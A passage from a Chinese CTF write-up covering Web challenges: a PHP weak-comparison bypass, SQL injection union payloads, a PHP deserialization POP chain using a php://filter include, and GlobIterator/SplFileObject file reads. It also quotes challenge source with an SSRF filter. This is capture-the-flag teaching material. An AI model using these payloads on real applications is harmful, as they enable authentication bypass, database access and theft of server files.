<div class="article_content clearfix" id="article_content">
<link href="style.css" rel="stylesheet"/>
<div class="markdown_views prism-atom-one-dark" id="content_views">
<svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
<path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
</svg>
<p></p>
<div class="toc">
<h3>目录</h3>
<ul><li><a href="#Web_1">Web</a></li><li><ul><li><a href="#_2">冬奥会</a></li><li><ul><li><a href="#_3">解题步骤</a></li><li><a href="#_5">详细描述</a></li><li><a href="#_43">解题收获</a></li></ul>
</li><li><a href="#Easy_sql_46">Easy_sql</a></li><li><ul><li><a href="#_47">解题步骤</a></li><li><a href="#_49">详细描述</a></li><li><a href="#_57">解题收获</a></li></ul>
</li><li><a href="#Pop2022_61">Pop2022</a></li><li><ul><li><a href="#_62">解题步骤</a></li><li><a href="#_64">详细描述</a></li><li><ul><li><a href="#_125">解题收获</a></li></ul>
</li></ul>
</li><li><a href="#findme_127">findme</a></li><li><ul><li><a href="#_128">解题步骤</a></li><li><a href="#_130">详细描述</a></li></ul>
</li><li><a href="#2_163">爱国敬业好青年-2</a></li><li><ul><li><a href="#_164">解题步骤</a></li><li><a href="#_166">详细描述</a></li><li><a href="#_191">解题收获</a></li></ul>
</li><li><a href="#_194">这是一道代码审计题</a></li></ul>
</li><li><a href="#Misc_260">Misc</a></li><li><ul><li><a href="#_261">单板小将苏翊鸣</a></li><li><ul><li><a href="#_262">解题步骤</a></li><li><a href="#_264">详细描述</a></li><li><a href="#_273">解题收获</a></li></ul>
</li><li><a href="#2022_275">2022冬奥会</a></li><li><ul><li><a href="#_276">解题步骤</a></li><li><a href="#_278">详细描述</a></li><li><a href="#_286">解题收获</a></li></ul>
</li><li><a href="#_288">隐秘的信息</a></li><li><ul><li><a href="#_289">解题步骤</a></li><li><a href="#_291">详细描述</a></li><li><a href="#_303">解题收获</a></li></ul>
</li><li><a href="#_306">降维打击</a></li><li><ul><li><a href="#_307">解题步骤</a></li><li><a href="#_309">详细描述</a></li><li><a href="#_321">解题收获</a></li></ul>
</li><li><a href="#1_323">藏在星空中的诗-1</a></li><li><ul><li><a href="#_324">解题步骤</a></li><li><a href="#_326">具体描述</a></li><li><a href="#_334">解题收获</a></li></ul>
</li><li><a href="#2_337">藏在星空中的诗-2</a></li><li><ul><li><a href="#_338">解题步骤</a></li><li><a href="#_340">具体描述</a></li><li><a href="#_370">解题收获</a></li></ul>
</li><li><a href="#_373">套中套</a></li><li><ul><li><a href="#_374">解题思路</a></li><li><a href="#_376">具体描述</a></li><li><a href="#_427">解题收获</a></li></ul>
</li><li><a href="#_430">真相只有一个</a></li><li><ul><li><a href="#_431">解题步骤</a></li><li><a href="#_433">详细描述</a></li><li><a href="#_447">解题收获</a></li></ul>
</li></ul>
</li><li><a href="#Reverse_450">Reverse</a></li><li><ul><li><a href="#GetTheTable_451">GetTheTable</a></li><li><ul><li><a href="#_452">解题步骤</a></li><li><a href="#_454">详细描述</a></li><li><a href="#_459">解题收获</a></li></ul>
</li><li><a href="#Amys_Code_462">Amy's Code</a></li><li><ul><li><a href="#_463">解题步骤</a></li><li><a href="#_465">具体描述</a></li><li><a href="#_556">解题收获</a></li></ul>
</li><li><a href="#How_decode_558">How_decode</a></li><li><ul><li><a href="#_559">解题步骤</a></li><li><a href="#_561">详细描述</a></li><li><a href="#_709">解题收获</a></li></ul>
</li><li><a href="#Sad_Code_711">Sad Code</a></li><li><ul><li><a href="#_712">解题步骤</a></li><li><a href="#_714">详细描述</a></li><li><a href="#_757">解题收获</a></li></ul>
</li><li><a href="#Bobs_Code_759">Bob's Code</a></li></ul>
</li><li><a href="#PWN_816">PWN</a></li><li><ul><li><a href="#create_id_817">create_id</a></li><li><ul><li><a href="#_818">解题步骤</a></li><li><a href="#_820">详细描述</a></li><li><a href="#_833">解题收获</a></li></ul>
</li><li><a href="#sim_treasure_836">sim_treasure</a></li><li><ul><li><a href="#_837">解题步骤</a></li><li><a href="#_840">详细描述</a></li><li><a href="#_860">解题收获</a></li></ul>
</li></ul>
</li><li><a href="#Mobile_862">Mobile</a></li><li><ul><li><a href="#Mobile1_863">Mobile1</a></li><li><ul><li><a href="#_864">解题步骤</a></li><li><a href="#_866">具体描述</a></li><li><a href="#_896">解题收获</a></li></ul>
</li></ul>
</li></ul>
</div>
<p></p>
<h1><a id="Web_1"></a>Web</h1>
<h2><a id="_2"></a>冬奥会</h2>
<h3><a id="_3"></a>解题步骤</h3>
<p>弱比较</p>
<h3><a id="_5"></a>详细描述</h3>
<p>题干</p>
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$Step1</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">;</span>
<span class="token variable">$Step2</span><span class="token operator">=</span><span class="token constant boolean">False</span><span class="token punctuation">;</span>
<span class="token variable">$info</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Information'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"year"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2022</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$Step1</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">OR</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">3</span> <span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$status</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"skiing"</span><span class="token punctuation">,</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$status</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"items"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=&gt;</span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"skiing"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Sorry~"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$Step2</span><span class="token operator">=</span><span class="token constant boolean">True</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$Step1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$Step2</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"2022flag.php"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span> 

</code></pre>
<p>$info[“year”]=2022，if比较的赋值，永真<br/> 0项值为0绕过array_search()函数，其他随意<br/> payload：</p>
<pre><code class="prism language-html">?Information={"year":"a","items":[0,["1","2","3"],"1"]}
</code></pre>
<h3><a id="_43"></a>解题收获</h3>
<p>“弱类型就是如此神奇”</p>
<h2><a id="Easy_sql_46"></a>Easy_sql</h2>
<h3><a id="_47"></a>解题步骤</h3>
<p>MySQL8新特性利用</p>
<h3><a id="_49"></a>详细描述</h3>
<p>sqlmap跑得mysql数据库版本为8，利用MySQL8新特性进行绕过 select<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/925e0ab17e164bf1827f9a45d0595476.png"/><br/> 题目说邮箱忘记了，猜测表名为emails<br/> payload: <code>id=-1 union table emails limit 7,1 </code><br/> 第七行第一条数据显示有一个压缩包文件<br/> 源码中可以看到username无任何过滤，<br/> payload: <code>usernmae=1' union select 1,0x61646d696e,3#&amp;passwd=3</code></p>
<h3><a id="_57"></a>解题收获</h3>
<p>学到了mysql8的table</p>
<h2><a id="Pop2022_61"></a>Pop2022</h2>
<h3><a id="_62"></a>解题步骤</h3>
<p>Road_is_Long-&gt;wakeup()(preg_match)-&gt;toString()(输出不存在的对象)-&gt;Make_a_Change-&gt;get()-&gt;Try_Work_Hard-&gt;invoke()(函数调用)-&gt;append()-&gt;include(包含flag)</p>
<h3><a id="_64"></a>详细描述</h3>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Road_is_Long</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$page</span><span class="token punctuation">;</span><span class="token comment">//Road_is_Long对象 1</span>
    <span class="token keyword">public</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token comment">//Make_a_Change对象 2</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">page</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'__toString'</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token keyword type-declaration">string</span><span class="token operator">-&gt;</span><span class="token property">page</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/file|ftp|http|https|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You can Not Enter 2022"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">page</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Try_Work_Hard</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span><span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Make_a_Change</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$effort</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">effort</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token comment">#不知道有啥用</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">effort</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
 
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Road_is_Long</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Make_a_Change</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Try_Work_Hard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">effort</span><span class="token operator">=</span><span class="token variable">$d</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token keyword type-declaration">string</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">page</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span>
 
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
<p>payload:<br/> <code>?wish=O%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3BO%3A12%3A%22Road_is_Long%22%3A2%3A%7Bs%3A4%3A%22page%22%3Bs%3A3%3A%22aaa%22%3Bs%3A6%3A%22string%22%3BO%3A13%3A%22Make_a_Change%22%3A1%3A%7Bs%3A6%3A%22effort%22%3BO%3A13%3A%22Try_Work_Hard%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A6%3A%22string%22%3BN%3B%7D</code></p>
<h4><a id="_125"></a>解题收获</h4>
<p>又找出一条链子</p>
<h2><a id="findme_127"></a>findme</h2>
<h3><a id="_128"></a>解题步骤</h3>
<p>利用GlobIterator和splFileObject类获得flag</p>
<h3><a id="_130"></a>详细描述</h3>
<p>根据题目提示找到源码<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/99e6a948aca94d0fb9eebb7e2e18e536.png"/></p>
<p>1、需要un2为空，un3=unserialize，un0读取文件类，un1读取目录下的文件</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">public</span> <span class="token variable">$une</span> <span class="token operator">=</span> GlobIterator<span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$un1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"./f*.*"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$un2</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$un3</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/b380c21e0456481688c78ea0a7cee856.png"/><br/> 根据该文件拿到flag</p>
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">a</span><span class="token punctuation">{<!-- --></span>
	<span class="token keyword">public</span> <span class="token variable">$une</span> <span class="token operator">=</span> splFileObject<span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$un1</span> <span class="token operator">=</span><span class="token string double-quoted-string">"fATE_gr19ande_Or0de8r.txt"</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$un2</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
	<span class="token keyword">public</span> <span class="token variable">$un3</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
<h2><a id="2_163"></a>爱国敬业好青年-2</h2>
<h3><a id="_164"></a>解题步骤</h3>
<p>找到正确的表格，get发包控制change开启，找到正确的经纬度就有flag</p>
<h3><a id="_166"></a>详细描述</h3>
<p>先看原码有一个/unser.php<br/> 跟进到下一个界面</p>
<p>一开始可以发现一个重影<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/160f2e584846490f8673175f9179d109.png"/><br/> f12能看到是两个表格，一真一假<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/07bf67161144401e8d7cd6bc3858d71a.png"/>错误的表单无法提交，点击是会弹窗</p>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/aee52f361e9544369b31d2caede3b680.png"/><br/> 在提交表单时有两种情况<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/44900a1d7aea4060af86f26df12986e7.png"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/326e3a106b174e2a8c0a7f0e05770b3c.png"/></p>
<p>查看原码<br/> 会调用GET和POST方法访问chage界面<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/7c923e3393da41beb66f85bbbc046328.png"/>bp抓包发现<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/0cb85400ae884567b65cd3e44de04610.png"/><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/d10d1391f76e47ce9a1af26e63274bac.png"/>可以看出一个是open一个是close，这一点f12查看网络也能发现<br/> 那么猜测环境要在open的情况下提交经纬度才能进行下一步<br/> 为了方便操作不让题目close，直接采用bp一个一个试<br/> 发现经纬度就是天安门广场的<br/> 输入得到flag<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/9ff75ac359854389b482845fc9586e04.png"/></p>
<h3><a id="_191"></a>解题收获</h3>
<p>真假表格<br/> f12看看网络有没有偷偷发包</p>
<h2><a id="_194"></a>这是一道代码审计题</h2>
<p>找到http://59.110.159.206:8040/static/code.txt<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/657fd85555194e13a20297fe99166b0a.png"/><br/> 表情包编码（base100编码）<br/> 解密得到</p>
<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">geneSign</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>control_key<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"You have not access to this page!"</span>

<span class="token keyword">def</span> <span class="token function">check_ssrf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    hostname <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname
    <span class="token comment">#域名</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'https?://@(?:[-\w.]|(?:%[\da-fA-F]{2}))+'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">raise</span> BaseException<span class="token punctuation">(</span><span class="token string">"url format error"</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span>  re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">'https?://@(?:[-\w.]|(?:%[\da-fA-F]{2}))+'</span><span class="token punctuation">,</span> url<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> judge_ip<span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">True</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">"You not get the right clue!"</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            ip_address <span class="token operator">=</span> socket<span class="token punctuation">.</span>getaddrinfo<span class="token punctuation">(</span>hostname<span class="token punctuation">,</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> is_inner_ipaddress<span class="token punctuation">(</span>ip_address<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token string">"inner ip address attack"</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">"You not get the right clue!"</span>
    <span class="token keyword">except</span> BaseException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token string">"unknow error"</span>

<span class="token keyword">def</span> <span class="token function">ip2long</span><span class="token punctuation">(</span>ip_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!L"</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>inet_aton<span class="token punctuation">(</span>ip_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">is_inner_ipaddress</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> ip2long<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
    <span class="token keyword">return</span> ip2long<span class="token punctuation">(</span><span class="token string">'127.0.0.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span> <span class="token operator">==</span> ip <span class="token operator">&gt;&gt;</span> <span class="token number">24</span> <span class="token keyword">or</span> ip2long<span class="token punctuation">(</span><span class="token string">'10.0.0.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span> <span class="token operator">==</span> ip <span class="token operator">&gt;&gt;</span> <span class="token number">24</span> <span class="token keyword">or</span> ip2long<span class="token punctuation">(</span><span class="token string">'172.16.0.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">20</span> <span class="token operator">==</span> ip <span class="token operator">&gt;&gt;</span> <span class="token number">20</span> <span class="token keyword">or</span> ip2long<span class="token punctuation">(</span><span class="token string">'192.168.0.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">16</span> <span class="token operator">==</span> ip <span class="token operator">&gt;&gt;</span> <span class="token number">16</span> <span class="token keyword">or</span> ip2long<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">24</span> <span class="token operator">==</span> ip <span class="token operator">&gt;&gt;</span> <span class="token number">24</span>

<span class="token keyword">def</span> <span class="token function">waf1</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
    forbidden_list <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> word <span class="token keyword">in</span> forbidden_list<span class="token punctuation">:</span>
